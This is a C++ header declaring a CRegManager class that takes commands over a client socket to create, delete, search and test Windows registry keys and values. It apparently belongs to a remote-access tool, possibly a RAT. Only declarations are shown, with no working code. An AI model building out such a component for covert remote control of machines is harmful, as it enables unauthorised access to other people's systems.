// RegManager.h: interface for the CRegManager class.
//
//////////////////////////////////////////////////////////////////////

#if !defined(AFX_REGMANAGER_H__0C956121_6484_4CA4_924D_0D4FBE35D5A6__INCLUDED_)
#define AFX_REGMANAGER_H__0C956121_6484_4CA4_924D_0D4FBE35D5A6__INCLUDED_

#if _MSC_VER > 1000
#pragma once
#endif // _MSC_VER > 1000

#include "../Manager.h"

class CRegManager  : public CManager  
{
public:
	CRegManager(CClientSocket *pClient);
	virtual ~CRegManager();
public:
	virtual void OnReceive(LPBYTE lpBuffer, UINT nSize);
protected:
	void TestEXSTR(char* buf);
	void TestDWORD(char* buf);
	void TestSTR(char* buf);
	void CreateKey(char* buf);
	void SendOK();
	void SendNO();
	void DelKey(char* buf);
	void CreatePath(char *buf);
	void DelPath(char* buf);
	void Find(char bToken,char* path);
};

#endif // !defined(AFX_REGMANAGER_H__0C956121_6484_4CA4_924D_0D4FBE35D5A6__INCLUDED_)
